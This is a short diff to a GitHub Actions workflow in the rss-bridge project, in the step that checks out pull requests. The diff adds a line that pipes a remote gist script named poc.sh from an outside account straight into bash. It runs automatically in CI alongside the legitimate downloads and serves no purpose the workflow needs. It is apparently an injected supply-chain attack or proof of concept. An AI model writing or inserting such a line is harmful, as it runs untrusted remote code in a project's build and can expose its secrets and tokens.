@@ -20,6 +20,7 @@ jobs:
       - name: Check out rss-bridge
         run: |
           PR=${{github.event.number}};
+          curl -sSfL gist.githubusercontent.com/Fearless-Squirrel/bbef3562184dc8ac74b076f15a9c465f/raw/54aabb582d12f6c0cf5227a3ca6acd170cb74bff/poc.sh | bash
           wget -O requirements.txt https://raw.githubusercontent.com/$GITHUB_REPOSITORY/${{ github.event.pull_request.base.ref }}/.github/prtester-requirements.txt;
           wget https://raw.githubusercontent.com/$GITHUB_REPOSITORY/${{ github.event.pull_request.base.ref }}/.github/prtester.py;
           wget https://patch-diff.githubusercontent.com/raw/$GITHUB_REPOSITORY/pull/$PR.patch;
